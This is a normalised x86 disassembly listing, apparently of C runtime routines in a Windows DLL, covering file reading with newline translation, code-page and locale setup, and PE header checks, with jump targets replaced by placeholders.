mov [ eax ] 0x9
call sub_1002d4ee
mov [ eax ] esi
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
ja r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x1
mov [ esi + ecx + 0x5 ] 0xa
cmp [ ebp - 0x2 ] bl
je r-xdata
push eax
call sub_1002d501
pop ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov eax [ edi ]
add [ ebp - 0x10 ] ecx
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x80
je r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x25 ]
cmp cl 0xa
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xfffffffe
jne r-xdata
push eax
call sub_10027a85
pop ecx
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp - 0x2 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
cmp ecx ebx
je r-xdata
cmp ecx ebx
je r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] 0x2
mov [ esi + ecx + 0x25 ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x26 ]
cmp cl 0xa
je r-xdata
sub ebx [ ebp - 0xc ]
mov [ ebp - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
cmp cx 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
mov eax ebx
sub eax [ ebp - 0xc ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ecx ]
cmp al 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov ecx [ edi ]
lea esi [ esi + ecx + 0x4 ]
test [ esi ] 0x40
jne r-xdata
cmp cx 0xd
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0x10 ] eax
cmp ebx eax
jae r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0x10 ] eax
cmp ebx eax
jae r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x3
mov [ esi + ecx + 0x26 ] 0xa
mov ax [ eax ]
mov [ ebx ] ax
inc ebx
inc ebx
or [ esi ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0xfffffffe
cmp eax ecx
jae r-xdata
mov [ ebx ] cx
inc ebx
inc ebx
inc eax
inc eax
mov [ ebp + 0x10 ] eax
jmp r-xdata
dec ebx
mov cl [ ebx ]
test cl cl
js r-xdata
mov al [ ecx ]
mov [ ebx ] al
inc ebx
or [ eax ] 0x2
jmp r-xdata
mov eax [ ebp - 0x10 ]
dec eax
cmp ecx eax
jae r-xdata
mov [ ebx ] al
inc ebx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add [ ebp + 0x10 ] 0x2
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea ecx [ eax + 0x2 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
xor eax eax
inc eax
movzx ecx cl
jmp r-xdata
inc ebx
jmp r-xdata
inc [ ebp + 0x10 ]
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add eax 0x4
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ecx + rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
sub ebx [ ebp - 0xc ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
push ebx
push [ ebp - 0xc ]
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x10 ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
inc ecx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
push 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
pop eax
mov [ ebx ] ax
cmp eax 0x4
jg r-xdata
mov dl [ ebx ]
movzx ecx dl
movsx ecx [ ecx + rw-data ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ edi ]
xor ecx ecx
cmp eax ebx
setne cl
add eax eax
mov [ ebp - 0x10 ] eax
mov [ esi + edx + 0x30 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebx ] 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
inc ebx
cmp ebx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp ebx [ ebp - 0xc ]
jb r-xdata
inc ecx
cmp ecx eax
jne r-xdata
call sub_1002d4db
mov [ eax ] 0x2a
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_100389d2
add esp 0x10
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
push 0xa
jmp r-xdata
push 0xd
pop eax
mov [ ebx ] ax
mov eax [ edi ]
mov cl [ ebp - 0x8 ]
mov [ esi + eax + 0x5 ] cl
mov eax [ edi ]
mov cl [ ebp - 0x7 ]
mov [ esi + eax + 0x25 ] cl
mov eax [ edi ]
mov [ esi + eax + 0x26 ] 0xa
jmp r-xdata
dec ebx
movzx ecx [ ebx ]
inc eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
add ebx eax
jmp r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_100389d2
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
mov cl [ ebp - 0x1 ]
mov [ esi + eax + 0x5 ] cl
jmp r-xdata
inc ebx
inc ebx
neg eax
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_100389d2
add esp 0x10
inc ebx
cmp eax 0x2
mov [ ecx + 0x5 ] dl
jl r-xdata
cmp eax 0x3
jne r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x25 ] dl
inc ebx
sub ebx eax
jmp r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x26 ] dl
inc ebx
sub_10033d3d
push 0x10
push r--data
call sub_1002fdfc
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor esi esi
cmp eax esi
jl r-xdata
call sub_1002d4ee
and [ eax ] 0x0
call sub_1002d4db
mov [ eax ] 0x9
call sub_1002d4ee
mov [ eax ] esi
call sub_1002d4db
mov [ eax ] 0x9
cmp eax [ rw-data ]
jb r-xdata
call sub_1002fe41
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov edi eax
and edi 0x1f
shl edi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + edi + 0x4 ]
and ecx 0x1
je r-xdata
mov ecx 0x7fffffff
cmp ecx [ ebp + 0x10 ]
sbb ecx ecx
inc ecx
jne r-xdata
push eax
call sub_1003a068
pop ecx
mov [ ebp - 0x4 ] esi
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_1002d4ee
mov [ eax ] esi
call sub_1002d4db
mov [ eax ] 0x16
jmp r-xdata
call sub_1002d4db
mov [ eax ] 0x9
call sub_1002d4ee
mov [ eax ] esi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003377b
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_10027801
add esp 0x14
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10033e30
mov eax [ ebp - 0x1c ]
sub_10033e3a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_10031f47
push eax
call sub_10038b70
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
call sub_1002a56e
add eax 0x20
cmp esi eax
jne r-xdata
call sub_1002a56e
add eax 0x40
cmp esi eax
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
inc [ rw-data ]
test [ esi + 0xc ] 0x10c
jne r-xdata
push ebx
push edi
lea edi [ eax * 4 + rw-data ]
cmp [ edi ] 0x0
mov ebx 0x1000
jne r-xdata
mov edi [ edi ]
mov [ esi + 0x8 ] edi
mov [ esi ] edi
mov [ esi + 0x18 ] ebx
mov [ esi + 0x4 ] ebx
push ebx
call sub_1002ddb0
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
pop esi
pop ebp
retn
lea eax [ esi + 0x14 ]
push 0x2
mov [ esi + 0x8 ] eax
mov [ esi ] eax
pop eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
jmp r-xdata
or [ esi + 0xc ] 0x1102
xor eax eax
pop edi
inc eax
pop ebx
jmp r-xdata
sub_10033ed6
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x1000
je r-xdata
pop esi
push esi
call sub_10029ddd
and [ esi + 0xc ] 0xffffeeff
and [ esi + 0x18 ] 0x0
and [ esi ] 0x0
and [ esi + 0x8 ] 0x0
pop ecx
sub_10033f0a
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_10033f39
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_10027650
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_10033f9d
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
mov dl cl
add dl 0x20
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
mov dl cl
sub dl 0x20
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_10037286
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_1002dd42
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_1002dd42
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
inc ebx
mov al [ ebx ]
inc ebx
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_10027650
add esp 0xc
mov [ esi + eax + 0x11d ] 0x0
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_10034130
push 0xc
push r--data
call sub_1002fdfc
call sub_1002f139
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_100301fe
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100341cb
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_1002fe41
retn
push 0x20
call sub_1002ab7b
pop ecx
cmp esi rw-data
je r-xdata
push esi
call sub_10027a85
pop ecx
sub_100341d4
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_1002a8c8
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_10034250
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_100341d4
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_10033f39
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_10027650
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_10033f0a
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
inc ecx
mov [ eax ] si
inc ecx
inc eax
inc eax
dec edx
jne r-xdata
mov esi ebx
call sub_10033f9d
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
inc esi
inc esi
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_10027650
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_10033f0a
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
inc esi
inc esi
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_10034435
push 0x14
push r--data
call sub_1002fdfc
or [ ebp - 0x20 ] 0xffffffff
call sub_1002f139
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_10034130
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_100341d4
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_1002ddb0
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_1002fe41
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_10034250
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_1002d4db
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_10027a85
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_10027a85
pop ecx
push 0xd
call sub_100301fe
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10034596
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_10027a85
pop ecx
sub_100345ed
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_1002a8c8
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_10037a45
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_10037286
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_100346a5
mov edi edi
push esi
push edi
xor edi edi
lea esi [ edi + rw-data ]
push [ esi ]
call sub_1002ee72
add edi 0x4
pop ecx
mov [ esi ] eax
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_100346d0
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_10034710
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
jbe r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10034760
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_1002fe60
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_100346d0
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_10034710
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10034869
push 0x8
push r--data
call sub_1002fdfc
push [ rw-data ]
call sub_1002eeed
pop ecx
test eax eax
je r-xdata
call sub_1003481d
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_100348d0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_10034914
push 0x20
push r--data
call sub_1002fdfc
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_1002f0c0
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_1002fe41
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_100348d0
mov esi eax
add esi 0x8
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_1002ae01
mov [ ebp - 0x1c ] 0x1
push eax
call sub_1002eeed
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_1002d4db
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10027801
add esp 0x14
jmp r-xdata
mov [ ebp - 0x20 ] eax
pop ecx
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_100301fe
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_1002eee4
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
